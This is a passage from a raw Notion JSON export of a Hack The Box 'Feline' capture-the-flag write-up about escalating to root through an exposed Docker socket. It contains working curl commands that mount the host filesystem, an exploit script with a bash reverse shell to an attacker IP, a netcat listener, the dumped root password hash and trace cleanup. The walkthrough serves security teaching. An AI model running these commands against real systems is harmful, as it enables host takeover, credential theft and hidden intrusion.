directory:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/f73745e1854f4247916465373e3ece70","type":"code","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["cd /root\nrm .wget-hsts\nls -la /var/run/\ncurl -s --unix-socket /var/run/docker.sock "],["http://localhost/images/json",[["a","http://localhost/images/json"]]]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/ee13409f161e473cb86a446f2112d86b","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[[".bash_history",[["c",null]]],[" is not symlinked to "],["/dev/null",[["c",null]]],[" and is readable:"]]},{"children":[],"uri":"https://www.notion.so/47fe9e2994b64488bd1cb43034b4a6b7","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Back-tracing the administrator's commands, we see that "],["docker.sock",[["c",null]]],[" was accessed recently with "],["curl",[["c",null]]],["."]]},{"children":[],"uri":"https://www.notion.so/e85e1a8847834d5798727a95eb343b04","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["If the administrator were to implement \"auto-spawning sandbox containers through events\" as mentioned in "],["todo.txt",[["c",null]]],[", then "],["docker.sock",[["c",null]]],[" is most likely exposed in some way on the SaltStack container."]]},{"children":[{"children":[],"uri":"https://www.notion.so/10ebd765fae64acaae6c31e0e491ac8f","type":"text","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["$ curl -s --unix-socket /var/run/docker.sock http://localhost/images/json",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/b6ad9e05d8714068acb58c8bdae5fbbe","type":"code","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["[{\"Containers\":-1,\"Created\":1590787186,\"Id\":\"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e\",\n\"Labels\":null,\"ParentId\":\"\",\"RepoDigests\":null,\"RepoTags\":[\"sandbox:latest\"],\"SharedSize\":-1,\"Size\":5574537,\"VirtualSize\":5574537},\n{\"Containers\":-1,\"Created\":1588544489,\"Id\":\"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9\",\n\"Labels\":null,\"ParentId\":\"\",\"RepoDigests\":[\"<none>@<none>\"],\"RepoTags\":[\"<none>:<none>\"],\"SharedSize\":-1,\"Size\":1056679100,\"VirtualSize\":1056679100}]"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/5052fe6dc0fb4414b7a58bdddae52a79","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Output upon running the "],["curl",[["c",null]]],[" command:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/963620e8748b4484a5d22c529ef922ff","type":"text","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["$ ls -la /var/run/docker.sock",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/90826fc2864a4efbb470ddc7e3780c5d","type":"code","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["srw-rw---- 1 root  118    0 Jan 27 05:20 docker.sock"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/573f5732272b4e7b827d9a98d4b826bf","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["We confirm that "],["docker.sock",[["c",null]]],[" is exposed and accessible using "],["curl",[["c",null]]],[" with flag "],["--unix-socket",[["c",null]]],[", this allows us to freely create, access, and modify docker containers on the host:"]]},{"children":[],"uri":"https://www.notion.so/46351d5219e640c08b3b583025701e3c","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Through "],["docker.sock",[["c",null]]],[", we can "],["mount",[["c",null]]],[" the host's file system on the container and perform a node takeover."]]},{"children":[{"children":[],"uri":"https://www.notion.so/65017460f4c74395af48d6b0cce53950","type":"code","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["# Creating a container\ncurl -i -s -k  -X 'POST' \\\n-H 'Content-Type: application/json' \\\n--data-binary '{\"Hostname\": \"\",\"Domainname\": \"\",\"User\": \"\",\"AttachStdin\": true,\"AttachStdout\": true,\"AttachStderr\": true,\"Tty\": true,\"OpenStdin\": true,\"StdinOnce\": true,\"Entrypoint\": \"/bin/bash\",\"Image\": \"ubuntu\",\"Volumes\": {\"/hostos/\": {}},\"HostConfig\": {\"Binds\": [\"/:/hostos\"]}}' \\\nhttp://<docker_host>:PORT/containers/create\n\n# Starting a container\ncurl -i -s -k  -X 'POST' \\\n-H 'Content-Type: application/json' \\\nhttp://<docker_host>:PORT/containers/<container_ID>/start"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/9af2912fdbe64916a8f21ae8a3f912e8","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Some example "],["curl",[["c",null]]],[" commands for interacting with "],["docker.sock",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/6aacbc57c61d4b0ca4745e07cbea4d2d","type":"code","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["#!/bin/bash\n# Command to be executed on startup of the Docker container\npayload=\"[\\\"/bin/sh\\\",\\\"-c\\\",\\\"chroot /tmp sh -c \\\\\\\"bash -c 'bash -i >& /dev/tcp/10.10.14.103/9999 0>&1'\\\\\\\"\\\"]\"\n\n# Create detached container samikowashere, execute payload, and bind to the host's filesystem.\ncurl -s -XPOST --unix-socket /var/run/docker.sock -d \"{\\\"Image\\\":\\\"sandbox\\\",\\\"cmd\\\":$payload,\\\"Binds\\\":[\\\"/:/tmp:rw\\\"]}\" -H 'Content-Type: application/json' http://localhost/containers/create?name=samikowashere\n\n# Start the container\ncurl -s -XPOST --unix-socket /var/run/docker.sock \"http://localhost/containers/samikowashere/start\""]],"language":"Bash","wrap":false}],"uri":"https://www.notion.so/80ae30c17db341a792a6044c633afc44","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Creating "],["ds_exploit.sh",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/2be9e5574bde46abbacf75d8e0f9ccc8","type":"text","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["$ curl http://10.10.14.103:9090/ds_exploit.sh -o ds_exploit.sh",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/23620f32c21849418e66797ab8cc7b70","type":"text","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["$ chmod +x ds_exploit.sh",[["c",null]]]]}],"uri":"https://www.notion.so/84e326433d6b4b43bb42e90c4528858d","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Get the exploit script on target machine, and make executable:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/6da56f049f974a26a6a1e4b4cb3ed430","type":"text","createdTime":1614683668583,"lastEditedTime":1614683640000,"title":[["$ nc -lvnp 9999",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/9cfb23ecb02f44ddbe5c8d5242146219","type":"text","createdTime":1614683668583,"lastEditedTime":1614683640000,"title":[["$ ./ds_exploit.sh",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/555d0f1e7ea64d5590e534549222c960","type":"code","createdTime":1614683668583,"lastEditedTime":1614683640000,"title":[["{\"Id\":\"aa30787a6c18ae6eccd785b50efdc59f4be896b8007c824586dc88af99a9fbae\",\"Warnings\":[]}"]],"language":"Docker","wrap":false}],"uri":"https://www.notion.so/836f59732d8046d5a33c2a63349a0cbf","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Listen for reverse shell locally, careful to not use ports that are already busy:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/bccc872c5ebb433080dfbadd5af7cf61","type":"text","createdTime":1614683668583,"lastEditedTime":1614683640000,"title":[["$ whoami && id && hostname",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/ebc5652d1b6c4c72a6dcd9400c4b7945","type":"code","createdTime":1614683668583,"lastEditedTime":1614683640000,"title":[["root\nuid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)\n7cfcbb71d11b"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/64e4ae52a54b45e6872fb3ba9ba6be6e","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["We should get a shell as root on a new Docker container, bound to the host's filesystem:"]]},{"children":[],"uri":"https://www.notion.so/f6a44dec2eaa4bd8a26ca8b2f1efafb5","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Get root flag!"]]},{"children":[],"uri":"https://www.notion.so/02cb0333a7ed478887163fb9c37a7fc2","type":"heading","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Persistence"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/98757023d09843f1acce38b6fc3da8f5","type":"code","createdTime":1614683668583,"lastEditedTime":1614683640000,"title":[["root:$6$XzluqBeUpIVqOvGi$1ngfZ.wa2hueUAkXFZjRZIyNxuQBboMC5319WC1lQcZORfGF6aKiG1mmnHaNnhFDTLeUknAre9ofC1KD/KvaU0:18430:0:99999:7:::"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/7d7e47b3a9864dd0a8742bbcfa386738","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Get root user's hash from "],["/etc/shadow",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/887e39eb231f495b9f407ad42b5d6c6a","type":"text","createdTime":1614683668583,"lastEditedTime":1614683640000,"title":[["$ rm /tmp/.samiko/ds_exploit.sh",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/5d872c83e5cd46a5a744d87c68ccda6d","type":"text","createdTime":1614683668583,"lastEditedTime":1614683640000,"title":[["$ rm /opt/samples/uploads/reverse.session",[["c",null]]]]}],"uri":"https://www.notion.so/33d2899c3dcc4dcbb864eecd6b2d1915","type":"bulleted_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Clean up after ourselves and delete any residual files, on both the host's filesystem and the SaltStack container:"]]},{"children":[],"uri":"https://www.notion.so/05eb7c152195453bbaceaaac233ae6f9","type":"heading","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["Resources"]],"depth":2},{"children":[],"uri":"https://www.notion.so/e68bc3af188a4f51a780b68c07aec7d7","type":"numbered_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/",[["a","https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/"]]]]},{"children":[],"uri":"https://www.notion.so/806c94fa5da24063b74aab4ab2b63498","type":"numbered_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652",[["a","https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652"]]]]},{"children":[],"uri":"https://www.notion.so/33c3c1fddf0e4ab99a9d0c203cce7f9e","type":"numbered_list","createdTime":1614683668578,"lastEditedTime":1614683640000,"title":[["https://github.com/jasperla/CVE-2020-11651-poc",[["a","https://github.com/jasperla/CVE-2020-11651-poc"]]]]},{"children":[],"uri":"https://www.notion.so/dacb9c3c8fcb492282196a44e70cfb69","type":"numbered_list","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["https://dejandayoff.com/the-danger-of-exposing-docker.sock/",[["a","https://dejandayoff.com/the-danger-of-exposing-docker.sock/"]]]]},{"children":[],"uri":"https://www.notion.so/dccad2e03a7d43baae507c58d19a10f0","type":"numbered_list","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["https://dreamlab.net/en/blog/post/abusing-dockersock-exposure/",[["a","https://dreamlab.net/en/blog/post/abusing-dockersock-exposure/"]]]]}],"uri":"https://www.notion.so/848ef735d8e44123b80324fddb20566d","type":"page","createdTime":1614683668575,"lastEditedTime":1617000600000,"title":[["Feline - 10.10.10.205"]],"icon":"https://www.hackthebox.eu/storage/avatars/1841efd90078820d7ddee432715f339d.png","fullWidth":true,"coverPosition":1,"properties":{"!`\"w":[["Yes"]],"'2]%":[["feline"]],"98uZ":[["Hard-difficulty Linux box on exploiting Apache Tomcat CVE-2020-9484 and abusing docker.sock exposure."]],":H`m":[["Yes"]],"xY$N":[["‣",[["d",{"type":"datetime","time_zone":"Australia/Adelaide","start_date":"2021-03-02","start_time":"21:44"}]]]],"{iD?":[["Hard,Linux,Insecure Deserialisation,SaltStack Salt,Docker"]],"|Ay0":[["post"]],"title":[["Feline - 10.10.10.205"]],"34dcb6ea-0b54-4d5c-97f2-1b547c003948":[["Yes"]],"3fe3e3bf-9500-4abb-8acd-67aba88e6f47":[["https://www.hackthebox.eu/home/machines/profile/274",[["a","https://www.hackthebox.eu/home/machines/profile/274"]]]],"7df966e1-a25b-4512-8e5c-761390b4c971":[["‣",[["d",{"type":"datetimerange","end_date":"2021-01-28","end_time":"00:31","time_zone":"Australia/Adelaide","start_date":"2021-01-26","start_time":"18:08"}]]]],"91d2ba37-40ae-4835-a8e9-f8710a2ecaf6":[["Yes"]],"c8554f2b-cb52-4987-be70-6d00db874c2b":[["Yes"]]}}